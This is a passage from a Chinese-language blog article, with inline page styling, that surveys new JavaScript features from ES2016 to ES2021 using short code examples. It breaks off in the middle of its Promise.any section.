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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ES6 是 2015 年发布的。<br/>
距离现在，已经过去整整十年。</p>
<p>这十年里，JavaScript 每一年都在进化。<br/>
新语法、新 API、新并发模型、新数据结构……</p>
<p>可大多数人，对 JavaScript 的认知，仍停留在：</p>
<ul>
<li>箭头函数</li>
<li>解构赋值</li>
<li>Promise</li>
<li>let / const</li>
</ul>
<p>从 ES2016 到 ES2025，你真的跟上了吗？</p>
<p>这篇文章，我会按时间线带你系统梳理 JavaScript 十年的演进轨迹。</p>
<hr/>
<h2 data-id="heading-0">ES2016 → ES2020</h2>
<p>这5年新出的特性我想大多数人都已经熟练使用了，这里就简单列下，不详细介绍api细节了</p>
<h3 data-id="heading-1">ES2016</h3>
<p>这是一个小版本,主要有以下3个特性：</p>
<ul>
<li><strong><code>Array.prototype.includes()</code></strong></li>
<li><strong>指数运算符 (<code>**</code>)</strong>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">2</span> ** <span class="hljs-number">3</span>; <span class="hljs-comment">// 8</span>
</code></pre>
</li>
<li><strong>幂赋值运算符<code>**=</code></strong>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> num = <span class="hljs-number">2</span>; 
num **= <span class="hljs-number">3</span>; <span class="hljs-comment">// num = num ** 3 </span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 8</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-2">ES2017</h3>
<p>ES2017的重点是异步编程，对象操作</p>
<ul>
<li><strong>async/await</strong></li>
<li><strong>Object.values()/Object.entries()</strong></li>
<li><strong>Object.getOwnPropertyDescriptors()</strong>: 返回对象所有自身属性的描述符对象</li>
<li><strong>字符串填充String Padding</strong></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5'</span>.<span class="hljs-title function_">padStart</span>(<span class="hljs-number">3</span>, <span class="hljs-string">'0'</span>)); <span class="hljs-comment">// '005' </span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello'</span>.<span class="hljs-title function_">padEnd</span>(<span class="hljs-number">10</span>, <span class="hljs-string">'*'</span>)); <span class="hljs-comment">// 'hello*****'</span>
</code></pre>
<ul>
<li>
<p><strong>SharedArrayBuffer 和 Atomics</strong></p>
<p>这两个用在web worker中。主线程和worker使用postMessage通信往往要将数据拷贝一份，SharedArrayBuffer 则允许 Worker 线程与主线程共享同一块内存，通过 <code>postMessage</code> 将 <code>SharedArrayBuffer</code> 转移给 Worker，不会复制数据：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main.js</span>
 <span class="hljs-keyword">const</span> sab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SharedArrayBuffer</span>(<span class="hljs-number">1024</span>);
 <span class="hljs-keyword">const</span> worker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">'worker.js'</span>);
 worker.<span class="hljs-title function_">postMessage</span>(sab); <span class="hljs-comment">//不复制数据</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// worker.js</span>
 self.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
   <span class="hljs-keyword">const</span> sab = e.<span class="hljs-property">data</span>; <span class="hljs-comment">// 同一个内存块</span>
 };
</code></pre>
</li>
</ul>
<p>计算机中写操作可能被编译成多条指令，如果尚未写完就有其他线程读数据，便会产生错误。在多线程操作SharedArrayBuffer时就可能会出现这种问题。Atomics提供了原子级操作，其他线程读取到的数据，要么是没写入的，要么是已写完的。另外Atomics还提供了线程的阻塞和唤醒。</p>
<h3 data-id="heading-3">ES2018</h3>
<p>ES2018新增了多个特性，算是一次中等规模升级，主要有异步编程的增强、对象和数组操作的改进、正则表达式的扩展，以及模板字面量的优化。</p>
<ul>
<li><strong>异步生成器/异步迭代器</strong></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>* <span class="hljs-title function_">fetchPages</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> page = <span class="hljs-number">1</span>;
  <span class="hljs-keyword">while</span> (page &lt;= <span class="hljs-number">3</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/page/<span class="hljs-subst">${page}</span>`</span>);
    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    page++;
  }
}

(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> data <span class="hljs-keyword">of</span> <span class="hljs-title function_">fetchPages</span>()) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
  }
})();
</code></pre>
<ul>
<li><strong><code>Promise.prototype.finally()</code></strong></li>
<li><strong>rest/spreat操作符<code>...</code></strong></li>
<li><strong>正则表达式增强（后行断言，命名捕获等）</strong></li>
<li><strong>模板字符串的标签模板提供raw访问原始字符串</strong></li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">tag</span>(<span class="hljs-params">strings</span>) { 
    <span class="hljs-keyword">return</span> strings.<span class="hljs-property">raw</span>[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 访问原始字符串，包括非法转义，比如LaTeX语法</span>
} 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(tag<span class="hljs-string">`\u{00000042}`</span>); <span class="hljs-comment">// strings[0]是'B' strings.raw[0]为\u{00000042}</span>
</code></pre>
<h3 data-id="heading-4">ES2019</h3>
<p>该版本内容不多但很实用</p>
<ul>
<li><strong>Array.prototype.flat() / flatMap()</strong></li>
<li><strong><code>Object.fromEntries()</code></strong></li>
<li><strong>String.trimStart() / trimEnd()</strong></li>
<li><strong>Optional catch binding</strong>: <code>catch</code> 可省略错误参数</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">try</span> {
  <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'invalid json'</span>);
} <span class="hljs-keyword">catch</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parsing failed'</span>); <span class="hljs-comment">// 无需未使用的 error 变量</span>
}
</code></pre>
<ul>
<li><strong>Symbol.description</strong></li>
<li><strong>Function.prototype.toString()能返回函数精确源码，包括注释和空格，方便调试</strong></li>
<li><strong>稳定的 Array.prototype.sort()</strong></li>
</ul>
<h3 data-id="heading-5">ES2020</h3>
<p>这个版本也是一个里程碑，更新了大量内容，而且都很实用</p>
<ul>
<li><strong>BigInt</strong></li>
<li><strong>Dynamic Import <code>import()</code></strong></li>
<li><strong>空值合并运算符<code>??</code></strong></li>
<li><strong>可选链运算符<code>?.</code></strong></li>
<li><strong>Promise.allSettled()</strong></li>
<li><strong>String.prototype.matchAll()</strong></li>
<li><strong>标准全局对象globalThis</strong></li>
<li><strong>模块命名空间导出（export * as ns from 'mod'）</strong></li>
<li><strong>for-in 枚举顺序与定义顺序一致</strong></li>
</ul>
<hr/>
<p>从ES2021开始新增的特性，在我日常code review中看到的越来越少了，但很多特性还是很实用的。</p>
<h2 data-id="heading-6">ES2021</h2>
<h3 data-id="heading-7">String.prototype.replaceAll()</h3>
<p>在此之前全局替换需要用正则/g标志</p>
<h3 data-id="heading-8">逻辑赋值运算符 (<code>&amp;&amp;=</code>, <code>||=</code>, <code>??=</code>)</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> x = <span class="hljs-number">0</span>;
x ||= <span class="hljs-number">10</span>; <span class="hljs-comment">// x = 10（因为 0 是 falsy）</span>

<span class="hljs-keyword">let</span> y = <span class="hljs-number">5</span>;
y &amp;&amp;= <span class="hljs-number">20</span>; <span class="hljs-comment">// y = 20（因为 5 是 truthy）</span>

<span class="hljs-keyword">let</span> z;
z ??= <span class="hljs-string">'default'</span>; <span class="hljs-comment">// z = 'default'（因为 undefined 是 nullish）</span>
</code></pre>
<h3 data-id="heading-9">数字分隔符(<code>1_000_000</code>)</h3>
<p>允许在数字字面量中使用下划线（_）作为分隔符，提高大数字的可读性。</p>
<h3 data-id="heading-10">Promise.any()</h3>
<p>返回一个 Promise，在任意一个输入 Promise resolved 时解决；如果所有 rejected，则返回 AggregateError。</p>
<ul>
<li>
<p><strong>语法</strong>：Promise.any(iterable)</p>
